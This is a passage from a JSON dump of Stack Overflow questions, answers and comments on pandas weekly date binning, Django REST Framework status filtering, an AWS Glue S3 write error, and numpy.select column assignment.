'variable']).reset_index()\ndf_aggr_D.drop(columns=['nd'], inplace=True)\n# the aggregate to weekly\ndf_aggr_W = df_aggr_D.set_index('date').groupby('id').resample('W').count()\ndf_aggr_W.loc[df_aggr_W['id']!=0].rename(columns={'id':'count'})\n</code></pre>\n\n<p><a href=\"https://i.stack.imgur.com/rj4bb.png\" rel=\"nofollow noreferrer\"><img src=\"https://i.stack.imgur.com/rj4bb.png\" alt=\"enter image description here\"></a></p>\n"}], "owner": {"reputation": 43, "user_id": 11709201, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/b1b4bc2979c6d8b9c5d80b56963249e0?s=128&d=identicon&r=PG&f=1", "display_name": "Haibin Chen", "link": "https://stackoverflow.com/users/11709201/haibin-chen"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 365, "favorite_count": 0, "answer_count": 1, "score": 1, "last_activity_date": 1571870088, "creation_date": 1571866537, "question_id": 58531292, "link": "https://stackoverflow.com/questions/58531292/pandas-given-start-and-end-date-bin-them-into-weekly-frequency-and-count", "title": "Pandas given start and end date, bin them into weekly frequency and count", "body": "<p>I have start data and end data define a period. I want to aggregate such periods into weekly, and counts the number of days allocated in each week. </p>\n\n<p>I think I have to use pd.cut with weekly bins. I am thinking to convert periods into column of dates first. Then use group by id and resample to do the count. I am stucked in convert periods to daily column. </p>\n\n<p>I am struggle to get the desired results by following <a href=\"https://stackoverflow.com/questions/42151886/expanding-pandas-data-frame-with-date-range-in-columns\">Expanding pandas data frame with date range in columns</a></p>\n\n<pre><code># dataframe\nprod_id = ['a', 'a', 'b', 'c']\nstart_date = ['2019-01-15',  '2019-08-10', '2019-06-15',  '2019-07-10']\nend_date = ['2019-01-28',  '2019-08-15', '2019-07-15',  '2019-07-22']\nd = {'id': prod_id, 'start': start_date, 'end': end_date}\ndf = pd.DataFrame.from_dict(d)\ndf = df[['id', 'start', 'end']]\ndf['start'] = pd.to_datetime(df['start'])\ndf['end'] = pd.to_datetime(df['end'])\n\n# bins\nfreq = 'W'\nbins = pd.date_range(pd.to_datetime('2018-10-01'), pd.to_datetime('2019-10-20'), freq=freq).tolist()   \n</code></pre>\n\n<p>the expected results is something like </p>\n\n<p><a href=\"https://i.stack.imgur.com/yLjNo.png\" rel=\"nofollow noreferrer\"><img src=\"https://i.stack.imgur.com/yLjNo.png\" alt=\"enter image description here\"></a></p>\n"}, {"tags": ["python", "json", "django", "django-rest-framework"], "comments": [{"owner": {"reputation": 1558, "user_id": 5589714, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/kurCN.png?s=128&g=1", "display_name": "w411 3", "link": "https://stackoverflow.com/users/5589714/w411-3"}, "edited": false, "score": 0, "creation_date": 1571880469, "post_id": 58531286, "comment_id": 103389230, "body": "your sample data... Are those data from models or you&#39;re sending them via frontend/jquery ?"}, {"owner": {"reputation": 73, "user_id": 10290511, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/c53833521f6fd45a67f7c75670782209?s=128&d=identicon&r=PG&f=1", "display_name": "Jack022", "link": "https://stackoverflow.com/users/10290511/jack022"}, "reply_to_user": {"reputation": 1558, "user_id": 5589714, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/kurCN.png?s=128&g=1", "display_name": "w411 3", "link": "https://stackoverflow.com/users/5589714/w411-3"}, "edited": false, "score": 0, "creation_date": 1571918414, "post_id": 58531286, "comment_id": 103403542, "body": "They are from my model. stored in my db"}, {"owner": {"reputation": 4002, "user_id": 115246, "user_type": "registered", "accept_rate": 30, "profile_image": "https://www.gravatar.com/avatar/68679b1383250255689fa4ac0b5cd611?s=128&d=identicon&r=PG", "display_name": "krubo", "link": "https://stackoverflow.com/users/115246/krubo"}, "edited": false, "score": 0, "creation_date": 1572104295, "post_id": 58531286, "comment_id": 103461045, "body": "What versions are you running? (<code>python --version</code>, <code>pip --version</code>, <code>pip show django</code>, <code>pip show django-filter</code>, <code>pip show djangorestframework</code>) Julien&#39;s answer works for me on Ubuntu 18.04 with python 3.6.8, pip 19.2.3, django 2.2.6, django-filter 2.2.0, djangorestframework 3.10.3."}, {"owner": {"reputation": 73, "user_id": 10290511, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/c53833521f6fd45a67f7c75670782209?s=128&d=identicon&r=PG&f=1", "display_name": "Jack022", "link": "https://stackoverflow.com/users/10290511/jack022"}, "edited": false, "score": 0, "creation_date": 1572166416, "post_id": 58531286, "comment_id": 103470924, "body": "It&#39;s Python 3.6, Django 2.1.7, DRF 3.9.2, Django Filter 1.1.0"}, {"owner": {"reputation": 73, "user_id": 10290511, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/c53833521f6fd45a67f7c75670782209?s=128&d=identicon&r=PG&f=1", "display_name": "Jack022", "link": "https://stackoverflow.com/users/10290511/jack022"}, "reply_to_user": {"reputation": 4002, "user_id": 115246, "user_type": "registered", "accept_rate": 30, "profile_image": "https://www.gravatar.com/avatar/68679b1383250255689fa4ac0b5cd611?s=128&d=identicon&r=PG", "display_name": "krubo", "link": "https://stackoverflow.com/users/115246/krubo"}, "edited": false, "score": 1, "creation_date": 1572166840, "post_id": 58531286, "comment_id": 103471007, "body": "Ok. The problem was Django Filter. I had the 1.1 version, i needed the 2.0 version. Thanks a lot @krubo!"}], "answers": [{"tags": [], "owner": {"reputation": 41, "user_id": 7852201, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/fVpuY.jpg?s=128&g=1", "display_name": "lanartri", "link": "https://stackoverflow.com/users/7852201/lanartri"}, "is_accepted": false, "score": 1, "last_activity_date": 1571892948, "creation_date": 1571892948, "answer_id": 58534375, "question_id": 58531286, "link": "https://stackoverflow.com/questions/58531286/filter-json-records-in-django-rest-framework/58534375#58534375", "title": "Filter json records in Django Rest Framework", "body": "<p>a few days ago i found and watched this video and i think it's useful for your question, (about model managers and querysets):</p>\n\n<p><a href=\"https://www.youtube.com/watch?v=rjUmA_pkGtw\" rel=\"nofollow noreferrer\">https://www.youtube.com/watch?v=rjUmA_pkGtw</a></p>\n"}, {"comments": [{"owner": {"reputation": 73, "user_id": 10290511, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/c53833521f6fd45a67f7c75670782209?s=128&d=identicon&r=PG&f=1", "display_name": "Jack022", "link": "https://stackoverflow.com/users/10290511/jack022"}, "edited": false, "score": 0, "creation_date": 1571951564, "post_id": 58536054, "comment_id": 103419370, "body": "Hey! Thanks for your answer. Ok, i can put this in my view, but then how do i filter from here? I mean, how do i choose what &#39;Status&#39; do i want? I mean &#39;Free&#39; or &#39;Taken&#39;"}, {"owner": {"reputation": 958, "user_id": 5681565, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/fa47f8f8f17c9b8e0d6143b83c549954?s=128&d=identicon&r=PG&f=1", "display_name": "Julien Kieffer", "link": "https://stackoverflow.com/users/5681565/julien-kieffer"}, "reply_to_user": {"reputation": 73, "user_id": 10290511, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/c53833521f6fd45a67f7c75670782209?s=128&d=identicon&r=PG&f=1", "display_name": "Jack022", "link": "https://stackoverflow.com/users/10290511/jack022"}, "edited": false, "score": 0, "creation_date": 1571951762, "post_id": 58536054, "comment_id": 103419449, "body": "You can get examples from the browsable API, but adding &#180;?Status=Free&#180; at the end of your URL should work."}, {"owner": {"reputation": 73, "user_id": 10290511, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/c53833521f6fd45a67f7c75670782209?s=128&d=identicon&r=PG&f=1", "display_name": "Jack022", "link": "https://stackoverflow.com/users/10290511/jack022"}, "edited": false, "score": 0, "creation_date": 1571952519, "post_id": 58536054, "comment_id": 103419661, "body": "Tried it, i&#39;m getting this error: cannot import name &#39;QUERY_TERMS&#39; from &#39;django.db.models.sql.constants&#39;"}, {"owner": {"reputation": 73, "user_id": 10290511, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/c53833521f6fd45a67f7c75670782209?s=128&d=identicon&r=PG&f=1", "display_name": "Jack022", "link": "https://stackoverflow.com/users/10290511/jack022"}, "edited": false, "score": 0, "creation_date": 1571952532, "post_id": 58536054, "comment_id": 103419664, "body": "I think it should be a compatibility issue with Django 2.0"}, {"owner": {"reputation": 958, "user_id": 5681565, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/fa47f8f8f17c9b8e0d6143b83c549954?s=128&d=identicon&r=PG&f=1", "display_name": "Julien Kieffer", "link": "https://stackoverflow.com/users/5681565/julien-kieffer"}, "reply_to_user": {"reputation": 73, "user_id": 10290511, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/c53833521f6fd45a67f7c75670782209?s=128&d=identicon&r=PG&f=1", "display_name": "Jack022", "link": "https://stackoverflow.com/users/10290511/jack022"}, "edited": false, "score": 0, "creation_date": 1571952570, "post_id": 58536054, "comment_id": 103419674, "body": "Which django version do you use ?"}, {"owner": {"reputation": 73, "user_id": 10290511, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/c53833521f6fd45a67f7c75670782209?s=128&d=identicon&r=PG&f=1", "display_name": "Jack022", "link": "https://stackoverflow.com/users/10290511/jack022"}, "edited": false, "score": 0, "creation_date": 1571952705, "post_id": 58536054, "comment_id": 103419713, "body": "i&#39;m usung Django 2.1.7"}, {"owner": {"reputation": 958, "user_id": 5681565, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/fa47f8f8f17c9b8e0d6143b83c549954?s=128&d=identicon&r=PG&f=1", "display_name": "Julien Kieffer", "link": "https://stackoverflow.com/users/5681565/julien-kieffer"}, "reply_to_user": {"reputation": 73, "user_id": 10290511, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/c53833521f6fd45a67f7c75670782209?s=128&d=identicon&r=PG&f=1", "display_name": "Jack022", "link": "https://stackoverflow.com/users/10290511/jack022"}, "edited": false, "score": 0, "creation_date": 1571952744, "post_id": 58536054, "comment_id": 103419730, "body": "And django filters si 2.0?"}, {"owner": {"reputation": 73, "user_id": 10290511, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/c53833521f6fd45a67f7c75670782209?s=128&d=identicon&r=PG&f=1", "display_name": "Jack022", "link": "https://stackoverflow.com/users/10290511/jack022"}, "edited": false, "score": 0, "creation_date": 1571954055, "post_id": 58536054, "comment_id": 103420094, "body": "No idea, but after searching for the error i got that it might be a compatibility issue"}, {"owner": {"reputation": 73, "user_id": 10290511, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/c53833521f6fd45a67f7c75670782209?s=128&d=identicon&r=PG&f=1", "display_name": "Jack022", "link": "https://stackoverflow.com/users/10290511/jack022"}, "edited": false, "score": 0, "creation_date": 1572166867, "post_id": 58536054, "comment_id": 103471010, "body": "The problem was my Django Filter version. I needed the 2.0 version, not the 1.1. Thank you!"}], "tags": [], "owner": {"reputation": 958, "user_id": 5681565, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/fa47f8f8f17c9b8e0d6143b83c549954?s=128&d=identicon&r=PG&f=1", "display_name": "Julien Kieffer", "link": "https://stackoverflow.com/users/5681565/julien-kieffer"}, "is_accepted": true, "score": 2, "last_activity_date": 1571901254, "creation_date": 1571901254, "answer_id": 58536054, "question_id": 58531286, "link": "https://stackoverflow.com/questions/58531286/filter-json-records-in-django-rest-framework/58536054#58536054", "title": "Filter json records in Django Rest Framework", "body": "<p>Have a look on <a href=\"https://www.django-rest-framework.org/api-guide/filtering/#filtering-against-query-parameters\" rel=\"nofollow noreferrer\">DRF doc</a>.\nIn your case, I'd suggest you install <code>django_filters</code>, then in your view:</p>\n\n<pre class=\"lang-py prettyprint-override\"><code>from django_filters.rest_framework import DjangoFilterBackend\n\nclass tstList(generics.ListCreateAPIView):\n    queryset = tst.objects.all()\n    serializer_class = tstSerializer\n    filter_backends = [DjangoFilterBackend]\n    filterset_fields = ('Status',)\n</code></pre>\n"}, {"comments": [{"owner": {"reputation": 73, "user_id": 10290511, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/c53833521f6fd45a67f7c75670782209?s=128&d=identicon&r=PG&f=1", "display_name": "Jack022", "link": "https://stackoverflow.com/users/10290511/jack022"}, "edited": false, "score": 0, "creation_date": 1572012100, "post_id": 58559698, "comment_id": 103439041, "body": "Yeah, that solution works. But this way, it waill always take the records set to &#39;Taken&#39;. But what if, for example, i would like to call all the records with the Status set to free, from my template?"}, {"owner": {"reputation": 1558, "user_id": 5589714, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/kurCN.png?s=128&g=1", "display_name": "w411 3", "link": "https://stackoverflow.com/users/5589714/w411-3"}, "reply_to_user": {"reputation": 73, "user_id": 10290511, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/c53833521f6fd45a67f7c75670782209?s=128&d=identicon&r=PG&f=1", "display_name": "Jack022", "link": "https://stackoverflow.com/users/10290511/jack022"}, "edited": false, "score": 0, "creation_date": 1572013045, "post_id": 58559698, "comment_id": 103439585, "body": "<code>tst.objects.filter(Status=&quot;Free&quot;)</code>"}, {"owner": {"reputation": 73, "user_id": 10290511, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/c53833521f6fd45a67f7c75670782209?s=128&d=identicon&r=PG&f=1", "display_name": "Jack022", "link": "https://stackoverflow.com/users/10290511/jack022"}, "edited": false, "score": 0, "creation_date": 1572014966, "post_id": 58559698, "comment_id": 103440674, "body": "Do i need to add both the lines to my view? To which url should i connect, later?"}], "tags": [], "owner": {"reputation": 1558, "user_id": 5589714, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/kurCN.png?s=128&g=1", "display_name": "w411 3", "link": "https://stackoverflow.com/users/5589714/w411-3"}, "is_accepted": false, "score": 1, "last_activity_date": 1572010864, "creation_date": 1572010864, "answer_id": 58559698, "question_id": 58531286, "link": "https://stackoverflow.com/questions/58531286/filter-json-records-in-django-rest-framework/58559698#58559698", "title": "Filter json records in Django Rest Framework", "body": "<p>You can set the queryset by <a href=\"https://docs.djangoproject.com/en/2.2/topics/db/queries/#retrieving-specific-objects-with-filters\" rel=\"nofollow noreferrer\">django filter</a></p>\n\n<pre><code>queryset = tst.objects.filter(Status=\"Taken\") # make sure the \"Taken\" is always Capitalized.\n</code></pre>\n"}], "owner": {"reputation": 73, "user_id": 10290511, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/c53833521f6fd45a67f7c75670782209?s=128&d=identicon&r=PG&f=1", "display_name": "Jack022", "link": "https://stackoverflow.com/users/10290511/jack022"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 433, "favorite_count": 0, "accepted_answer_id": 58536054, "answer_count": 3, "score": 0, "last_activity_date": 1572042747, "creation_date": 1571866518, "last_edit_date": 1572042747, "question_id": 58531286, "link": "https://stackoverflow.com/questions/58531286/filter-json-records-in-django-rest-framework", "title": "Filter json records in Django Rest Framework", "body": "<p>I created a DRF API endpoint in order to be able to grab some data to my database and show it on my Django page using Jquery.</p>\n\n<p>My sample data looks like this:</p>\n\n<pre><code>{\n    \"item\": \"Someitem\",\n    \"Price\": 120,\n    \"Status\": \"Free\"\n},\n{\n    \"item\": \"SecondItem,\n    \"Price\": 90,\n    \"Status\": \"Taken\"\n},\n</code></pre>\n\n<p>So if i retrieve the endpoint from JQuery to this link: <code>http://127.0.0.1:8000/tst/</code>, i'll get all the records and have all of them shown in my web page. But what if, for example, i only want to retrieve <strong>only</strong> the records whose <code>Status</code> field is set to <code>Taken</code>? Is there any way to edit the DRF request so that it points to <code>http://127.0.0.1:8000/tst/Taken</code>? Or instead, if the user wants to retrieve all the others with the status set to <code>Free</code>, it will point to <code>http://127.0.0.1:8000/tst/Free</code>? I know i could do it with jquery, but i would actually like to do it server-side.</p>\n\n<p>I tried with this:</p>\n\n<pre><code>queryset = tst.objects.filter(Status=\"Taken\")\n</code></pre>\n\n<p>But the problem here, is that it will always take <strong>only</strong> the <code>Taken</code> records from my DB. In my case, i want to find a way to retrieve <code>Taken</code> sometimes, and <code>Free</code> some other times from the template.</p>\n\n<p>I'm fairly new to DRF, so my setup is pretty basic:</p>\n\n<p><strong>views.py</strong></p>\n\n<pre><code>class tstList(generics.ListCreateAPIView):\n    queryset = tst.objects.all()\n    serializer_class = tstSerializer\n\n\nclass tstDetail(generics.RetrieveUpdateDestroyAPIView):\n    queryset = tst.objects.all()\n    serializer_class = tstSerializer\n</code></pre>\n\n<p><strong>url.py</strong></p>\n\n<pre><code>path('tst/', views.tstList.as_view()),\npath('tst/&lt;int:pk&gt;/', views.tstDetail.as_view()),\n</code></pre>\n\n<p><strong>models.py</strong></p>\n\n<pre><code>class tst(models.Model):\n    item = models.CharField()\n    Price = models.FloatField()\n    Status = models.CharField()\n\n\n    def save(self, *args, using=None, **kwargs):\n        super(tst, self).save(*args, **kwargs)\n</code></pre>\n"}, {"tags": ["python", "amazon-s3", "pyspark", "aws-glue"], "comments": [{"owner": {"reputation": 8944, "user_id": 1779128, "user_type": "registered", "accept_rate": 89, "profile_image": "https://i.stack.imgur.com/oAInT.jpg?s=128&g=1", "display_name": "RobinL", "link": "https://stackoverflow.com/users/1779128/robinl"}, "edited": false, "score": 0, "creation_date": 1571922013, "post_id": 58531280, "comment_id": 103405398, "body": "I suspect that your <code>Map.apply</code> command is doing something different to what you expect.  What happens if you substitute <code>new</code> in the final line for <code>df</code> to make it <code>df.write.csv(path=output_path, mode=&#39;append&#39;, compression=&#39;gzip&#39;,sep=&#39;|&#39;, header=&#39;true&#39;)</code>.  I suspect this will work?"}, {"owner": {"reputation": 655, "user_id": 10220535, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/ee2c99218f3d1591d2e9eae54dcfddaf?s=128&d=identicon&r=PG&f=1", "display_name": "Tesuji", "link": "https://stackoverflow.com/users/10220535/tesuji"}, "reply_to_user": {"reputation": 8944, "user_id": 1779128, "user_type": "registered", "accept_rate": 89, "profile_image": "https://i.stack.imgur.com/oAInT.jpg?s=128&g=1", "display_name": "RobinL", "link": "https://stackoverflow.com/users/1779128/robinl"}, "edited": false, "score": 0, "creation_date": 1571933335, "post_id": 58531280, "comment_id": 103411738, "body": "I tried that too and it also gave me the same error"}, {"owner": {"reputation": 8944, "user_id": 1779128, "user_type": "registered", "accept_rate": 89, "profile_image": "https://i.stack.imgur.com/oAInT.jpg?s=128&g=1", "display_name": "RobinL", "link": "https://stackoverflow.com/users/1779128/robinl"}, "edited": false, "score": 0, "creation_date": 1571933667, "post_id": 58531280, "comment_id": 103411883, "body": "Not sure what&#39;s going on, but I can confirm I have a bunch of AWS Glue code which has <code>df.write.csv()</code> and works fine..."}, {"owner": {"reputation": 655, "user_id": 10220535, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/ee2c99218f3d1591d2e9eae54dcfddaf?s=128&d=identicon&r=PG&f=1", "display_name": "Tesuji", "link": "https://stackoverflow.com/users/10220535/tesuji"}, "reply_to_user": {"reputation": 8944, "user_id": 1779128, "user_type": "registered", "accept_rate": 89, "profile_image": "https://i.stack.imgur.com/oAInT.jpg?s=128&g=1", "display_name": "RobinL", "link": "https://stackoverflow.com/users/1779128/robinl"}, "edited": false, "score": 0, "creation_date": 1571952096, "post_id": 58531280, "comment_id": 103419548, "body": "I finally got it working. I followed the aws documentation and used <code>df.write(connection_type=&quot;s3&quot;,connection_options={&quot;path&quot;:out&zwnj;&#8203;put_path},format=&quot;cs&zwnj;&#8203;v&quot;)</code>. I am using Python 3, Spark 2.4 for my job. I did notice however that in the outputfile, it included a bunch of blank columns labeled col4,col5...col89 when in reality my data scheme only had 3 columns (Name, Age, Sex). Is this working as intended??"}, {"owner": {"reputation": 1474, "user_id": 7613340, "user_type": "registered", "profile_image": "https://lh5.googleusercontent.com/-CXsnCSktSjI/AAAAAAAAAAI/AAAAAAAAAAA/-LaKIq-KzTs/photo.jpg?sz=128", "display_name": "Sandeep Fatangare", "link": "https://stackoverflow.com/users/7613340/sandeep-fatangare"}, "edited": false, "score": 0, "creation_date": 1571983891, "post_id": 58531280, "comment_id": 103425950, "body": "How can you add struct to CSV? your <code>combineNames()</code> is creating Struct type. Can you try changing <code>format=&quot;csv&quot;</code> to <code>format=&quot;json&quot;</code>"}], "answers": [{"tags": [], "owner": {"reputation": 21, "user_id": 11842006, "user_type": "registered", "profile_image": "https://lh5.googleusercontent.com/-aQ507100C_0/AAAAAAAAAAI/AAAAAAAAABM/WdBs7np-hdc/photo.jpg?sz=128", "display_name": "sam agrawal", "link": "https://stackoverflow.com/users/11842006/sam-agrawal"}, "is_accepted": false, "score": 0, "last_activity_date": 1610160401, "creation_date": 1610160401, "answer_id": 65638863, "question_id": 58531280, "link": "https://stackoverflow.com/questions/58531280/cannot-write-to-s3-from-aws-glue-attribute-error/65638863#65638863", "title": "Cannot write to s3 from aws glue (attribute error)", "body": "<p>Another way I think in which it will work is -</p>\n<pre><code>#Dynamic Frame\ndf = glueContext.create_dynamic_frame.from_catalog(\n   database = database,\n   table_name = &quot;my_table_name&quot;) \n\n#Make it DataFrame\ndf = df.toDF().coalesce(1) \n\nnew =  Map.apply(frame = df, f = combineNames)\nnew.write.csv(path=output_path, mode='append', compression='gzip',sep='|', header='true')\n</code></pre>\n<p>Similarly if we want to go from DataFrame to DynamicFrame -</p>\n<pre><code>from awsglue.dynamicframe import DynamicFrame\nDyF = DynamicFrame.fromDF(df, glueContext, &quot;DyF&quot;)\n</code></pre>\n"}], "owner": {"reputation": 655, "user_id": 10220535, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/ee2c99218f3d1591d2e9eae54dcfddaf?s=128&d=identicon&r=PG&f=1", "display_name": "Tesuji", "link": "https://stackoverflow.com/users/10220535/tesuji"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": false, "view_count": 356, "favorite_count": 0, "answer_count": 1, "score": 0, "last_activity_date": 1610160401, "creation_date": 1571866475, "question_id": 58531280, "link": "https://stackoverflow.com/questions/58531280/cannot-write-to-s3-from-aws-glue-attribute-error", "title": "Cannot write to s3 from aws glue (attribute error)", "body": "<p>I want to write to a csv file in a folder in s3. Simple enough right?</p>\n\n<p>Here is a snippet of my code with a simple map.</p>\n\n<pre><code>import sys\nfrom awsglue.transforms import *\nfrom awsglue.utils import getResolvedOptions\nfrom pyspark.context import SparkContext\nfrom awsglue.context import GlueContext\nfrom awsglue.job import Job\nfrom pyspark.sql import SparkSession\n\n\ndef combineNames(rec):\n    rec[\"Name\"] = {}\n    rec[\"Name\"][\"First\"] = rec[\"first\"]\n    rec[\"Name\"][\"Last\"] = rec[\"last\"]\n    del rec[\"first\"]\n    del rec[\"last\"]\n    return rec\n\n\nglueContext = GlueContext(SparkContext.getOrCreate())\nbucket_name = \"my-bucket-name\"\ndatabase = \"my-database\"\noutput_path = \"s3://{}/outputs/output.csv\".format(bucket_name)\nprint(\"Data schema before maps\")\ndf = glueContext.create_dynamic_frame.from_catalog(\n       database = database,\n       table_name = \"my_table_name\")\nnew =  Map.apply(frame = df, f = combineNames)\nnew.write.csv(path=output_path, mode='append', compression='gzip',sep='|', header='true')\n</code></pre>\n\n<p>However, when I run this job, I get an attribute error: <code>AttributeError: 'function' object has no attribute 'csv'</code></p>\n\n<p>I was under the impression for PySpark 2 and above, I can just do <code>df.write.csv</code>, as opposed to the previous way which was <code>df.write.format</code>.</p>\n\n<p>I am using Python 3 and PySpark 2.4 if that helps. </p>\n"}, {"tags": ["python", "python-3.x", "pandas", "loops"], "answers": [{"comments": [{"owner": {"reputation": 619, "user_id": 12226377, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/eb4e35b4d49c891ab68f5f9bab16620a?s=128&d=identicon&r=PG&f=1", "display_name": "Django0602", "link": "https://stackoverflow.com/users/12226377/django0602"}, "edited": false, "score": 0, "creation_date": 1571868346, "post_id": 58531431, "comment_id": 103386896, "body": "This will work but if I want to do this for 20 different months, then this will be very redundant. Is there a possibility to write a loop and assign values?"}, {"owner": {"reputation": 26154, "user_id": 11884237, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/7d7q4.png?s=128&g=1", "display_name": "ansev", "link": "https://stackoverflow.com/users/11884237/ansev"}, "reply_to_user": {"reputation": 619, "user_id": 12226377, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/eb4e35b4d49c891ab68f5f9bab16620a?s=128&d=identicon&r=PG&f=1", "display_name": "Django0602", "link": "https://stackoverflow.com/users/12226377/django0602"}, "edited": false, "score": 0, "creation_date": 1571868637, "post_id": 58531431, "comment_id": 103386975, "body": "Yes you can use a for loop. See my updated solution!"}, {"owner": {"reputation": 26154, "user_id": 11884237, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/7d7q4.png?s=128&g=1", "display_name": "ansev", "link": "https://stackoverflow.com/users/11884237/ansev"}, "reply_to_user": {"reputation": 619, "user_id": 12226377, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/eb4e35b4d49c891ab68f5f9bab16620a?s=128&d=identicon&r=PG&f=1", "display_name": "Django0602", "link": "https://stackoverflow.com/users/12226377/django0602"}, "edited": false, "score": 0, "creation_date": 1571868735, "post_id": 58531431, "comment_id": 103387004, "body": "Also depend on what month you want to use"}, {"owner": {"reputation": 619, "user_id": 12226377, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/eb4e35b4d49c891ab68f5f9bab16620a?s=128&d=identicon&r=PG&f=1", "display_name": "Django0602", "link": "https://stackoverflow.com/users/12226377/django0602"}, "edited": false, "score": 0, "creation_date": 1571870223, "post_id": 58531431, "comment_id": 103387363, "body": "I got this error :  list of cases must be same length as list of conditions                 but when I can check back I have the same number of columns as compared to the number variables that I have created :"}, {"owner": {"reputation": 26154, "user_id": 11884237, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/7d7q4.png?s=128&g=1", "display_name": "ansev", "link": "https://stackoverflow.com/users/11884237/ansev"}, "reply_to_user": {"reputation": 619, "user_id": 12226377, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/eb4e35b4d49c891ab68f5f9bab16620a?s=128&d=identicon&r=PG&f=1", "display_name": "Django0602", "link": "https://stackoverflow.com/users/12226377/django0602"}, "edited": false, "score": 0, "creation_date": 1571870720, "post_id": 58531431, "comment_id": 103387473, "body": "Yes, the list of length of values must be the same than the length of list of conditions. For each condition should there are a value.How to select the values depend on your aplication. Depend on what you want to do you should use numpy select"}, {"owner": {"reputation": 26154, "user_id": 11884237, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/7d7q4.png?s=128&g=1", "display_name": "ansev", "link": "https://stackoverflow.com/users/11884237/ansev"}, "reply_to_user": {"reputation": 619, "user_id": 12226377, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/eb4e35b4d49c891ab68f5f9bab16620a?s=128&d=identicon&r=PG&f=1", "display_name": "Django0602", "link": "https://stackoverflow.com/users/12226377/django0602"}, "edited": false, "score": 0, "creation_date": 1571870833, "post_id": 58531431, "comment_id": 103387501, "body": "The length of values list is the output of <code>df2[&#39;month&#39;].nunique()</code>"}, {"owner": {"reputation": 619, "user_id": 12226377, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/eb4e35b4d49c891ab68f5f9bab16620a?s=128&d=identicon&r=PG&f=1", "display_name": "Django0602", "link": "https://stackoverflow.com/users/12226377/django0602"}, "edited": false, "score": 0, "creation_date": 1571870966, "post_id": 58531431, "comment_id": 103387523, "body": "Correct.. Worked fine for me!"}], "tags": [], "owner": {"reputation": 26154, "user_id": 11884237, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/7d7q4.png?s=128&g=1", "display_name": "ansev", "link": "https://stackoverflow.com/users/11884237/ansev"}, "is_accepted": true, "score": 2, "last_activity_date": 1571868580, "last_edit_date": 1571868580, "creation_date": 1571867390, "answer_id": 58531431, "question_id": 58531274, "link": "https://stackoverflow.com/questions/58531274/assinging-variable-value-to-a-new-column-in-pandas-dataframe/58531431#58531431", "title": "Assinging variable value to a new column in pandas DataFrame", "body": "<p>You want<code>numpy.select</code>:</p>\n\n<pre><code>cond=[(df2['month'] == month) for month in df2['month'].unique()]\nvalues=[a, b, c] \n\ndf2['dest_col'] = np.select(cond,values)\n</code></pre>\n"}], "owner": {"reputation": 619, "user_id": 12226377, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/eb4e35b4d49c891ab68f5f9bab16620a?s=128&d=identicon&r=PG&f=1", "display_name": "Django0602", "link": "https://stackoverflow.com/users/12226377/django0602"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 35, "favorite_count": 1, "accepted_answer_id": 58531431, "answer_count": 1, "score": 0, "last_activity_date": 1574333690, "creation_date": 1571866418, "last_edit_date": 1574333690, "question_id": 58531274, "link": "https://stackoverflow.com/questions/58531274/assinging-variable-value-to-a-new-column-in-pandas-dataframe", "title": "Assinging variable value to a new column in pandas DataFrame", "body": "<p>I have created 3 new variables a,b and c using certain conditions. Now I want to assign these variables to a new column in a pandas DataFrame again using some conditions.</p>\n\n<p>I want a code something like what I have written below but in a smarter way. The code below is working fine but it's not a smart solution. Is there a possibility to write a loop, maybe an iterative loop</p>\n\n<pre><code>df2['dest_col'] = np.where(df2['month'] == 'March-2016',a\n                  ,(np.where(df2['month'] == 'April-2016',b\n                  ,(np.where(df2['month'] == 'May-2016',c)))\n</code></pre>\n"}, {"tags": ["python", "python-3.x", "pandas"], "comments": [{"owner": {"reputation": 63658, "user_id": 5014455, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/JTknr.png?s=128&g=1", "display_name": "juanpa.arrivillaga", "link": "https://stackoverflow.com/users/5014455/juanpa-arrivillaga"}, "edited": false, "score": 1, "creation_date": 1571866538, "post_id": 58531273, "comment_id": 103386365, "body": "Possible duplicate 